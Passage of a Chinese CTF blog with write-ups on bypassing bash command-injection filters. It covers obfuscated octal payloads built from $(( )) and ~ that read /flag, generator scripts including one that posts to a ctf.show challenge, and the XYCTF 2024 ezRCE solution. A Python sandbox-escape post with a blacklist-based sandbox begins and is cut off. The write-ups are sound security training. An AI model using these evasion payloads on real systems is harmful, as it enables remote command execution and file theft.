<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line"></span><br><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br><span class="line"></span><br><span class="line">相对应的： $((~$((~$(($(())))$((~$(())))))))$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())</span><br><span class="line"></span><br><span class="line">$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>在终端输出看一下，均成功构造。不要构造了，到后面的加入<code>#</code>运用是错的，但还是可以自己去构造着试试。</p>
<p>去看了一下<a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow的极限rce的level5</a>，茅塞顿开，<u>我的思维又局限了</u>，已经可以构造出来十进制的字符串了，还干嘛费心费力去转二进制然后回十进制，变通，<strong>强调脑子要变通</strong>，那么就如下构造一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那现在需要的就是1、 5 、4 、6 、3</span><br><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>再传入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p>成功构造出：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png" alt="image-20240603191723486"></p>
<p>这个同样有字符串那个问题，原因在本篇文章第一次提出这个问题给的参考那里有说，个人理解大概就是对于一个shell变量只进行一次，所以最后构造出来的<code>$&#39;&#39;</code>不会再运行。</p>
<p>解决方法同样使用两次bash，先试试，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p>然后传入成功执行<code>ls</code>，那么如何利用这个构造<code>bash</code>呢，不能只是简单的<code>$</code>+<code>$(())</code>，这样就算传进去也只会导致两个<code>$$</code>执行查看进程的命令，那么该如何构造呢，文章提出了思路：</p>
<p>我们已知<code>$&#123;!#&#125;</code>输出为bash，结合间接引用<code>$&#123;!var&#125; -间接引用</code>的说明，在这里我们并没有对<code>#</code>这个赋值，却可以输出<code>bash</code>，那么我们是否可以猜测只要是没有值的参数，在这里都可以拿到<code>bash</code>这个输出，测试一下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png" alt="image-20240603203638487"></p>
<p>在这张图片中，**可以看到<code>$&#123;!?&#125;</code>也是输出的<code>bash</code>**，虽然不知道为什么<code>$&#123;!0&#125;</code>没有输出（可能是因为是数字），但是可以采用第三个方法输出。这三个思路就是文章提出的，个人感觉还是挺精妙的</p>
<p>所以在这里仅能通过<strong>定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0</strong>，<strong>然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh/bash</code>字符</strong>。两条命令间通过<code>&amp;&amp;(应该也可以使用 ; )</code>进行连接。由于bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。所以这里是<code>__</code>作为变量名。</p>
<p>最终<code>ls</code>的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p>wc，又是这个问题，宝塔linux本地只能用<code>bash</code>，换到centos跑一下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png" alt="image-20240603204738674"></p>
<p>成功执行，其他的payload构造也是同理。</p>
<p>官方wp给了脚本（偷个懒），如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<p><strong>来看看博主的方法</strong>，<code>$(())</code>对应0，使用自增构造出了1，2这两个数字。</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png" alt="image-20240603165230257"></p>
<p>payload如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>自增需要抓包后url编码传参</strong></p>
<p>可以使用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>



<h5 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用 $? 构造"></a>利用 $? 构造</h5><p>正如上面说的，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，需要的值为<code>0</code>、<code>1</code>，2可以由<code>&lt;&lt;</code>得到</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png" alt="image-20240603161335061"></p>
<p>，这里只要最后的命令的推出状态没有错误就可以得到0，但是1就不能得到了，可以使用自增运算，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag:</span><br><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>自增运算时传参需要url编码一下。</strong></p>
<p>利用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>自增等后面再来研究</p>
<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="XYCTF-2024-ezRCE"><a href="#XYCTF-2024-ezRCE" class="headerlink" title="XYCTF 2024 - ezRCE"></a>XYCTF 2024 - ezRCE</h6><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>

<p>就是考的八进制数据，没有禁<code>&#39;</code>，先尝试直接<code>ls</code>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png" alt="image-20240603180726080"></p>
<p>读取根目录（<code>ls /</code>），可以如下构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt;$&#x27;\154\163\40\57&#x27;</span><br><span class="line">$0&lt;&lt;&lt;\$0\&lt;\&lt;\&lt;\$\&#x27;\\154\\163\\40\\57\&#x27;</span><br><span class="line">防止转义</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png" alt="image-20240603180945707"></p>
<p>最后读flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>

<p>读到flag</p>
<p>但是正如常用的<code>bash&lt;&lt;&lt;...</code>这道题还可以尝试构造<code>bash</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>

<p>也可以成功读到flag。</p>
<p>注意知识点的融汇贯通。</p>
<p>其他的题可以看看</p>
<p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-周末大挑战官方wp</a></p>
]]></content>
      <categories>
        <category>rce</category>
        <category>rce之利用shell变量</category>
      </categories>
  </entry>
  <entry>
    <title>python沙箱逃逸</title>
    <url>/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
<span id="more"></span>

<h3 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h3><p>沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。</p>
<p>在Python中，沙箱主要用于限制Python代码的能力，例如，阻止其访问文件系统、网络，或者限制其使用的系统资源。Python沙箱的实现方式有多种，包括使用 Python 的内置功能（如re模块），使用特殊的 Python 解释器（如PyPy），或者使用第三方库（如RestrictedPython）。</p>
<p>然而，Python 并没有提供内建的、可靠的沙箱机制,并且 Python 的标准库和语言特性提供了很多可以用于逃逸沙箱的方法，因此在实践中创建一个完全安全的 Python 沙箱非常困难。</p>
<h3 id="常见沙箱"><a href="#常见沙箱" class="headerlink" title="常见沙箱"></a>常见沙箱</h3><h4 id="exec-执行"><a href="#exec-执行" class="headerlink" title="exec 执行"></a>exec 执行</h4><p>Python的<code>exec()</code>是一个内建函数，用来执行动态生成的Python代码。也就是说，<code>exec()</code>可以执行储存在字符串或者对象中的Python。<code>exec()</code>基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(object, globals, locals)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>object</code> 必需参数，是一个字符串，或者是任何可以被 <code>compile()</code> 函数转化为代码对象的对象。</li>
<li><code>globals</code> 可选参数，是一个字典，表示全局命名空间 (全局变量)，如果提供了，则在执行代码中被用作全局命名空间。</li>
<li><code>locals</code> 可选参数，可以是任何映射对象，表示局部命名空间 (局部变量)，如果被提供，则在执行代码中被用作局部命名空间。如果两者都被忽略，那么在 <code>exec()</code> 调用的地方决定执行的命名空间。</li>
</ul>
<p><strong>exec还有另外一种写法：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec command in _global</span><br></pre></td></tr></table></figure>

<p>其中<code>_global</code>为一个字典，表示command将在<code>_global</code>指定的命名空间中运行。</p>
<p>示例沙箱：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getexp</span>():</span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_filter</span>(<span class="params">command</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        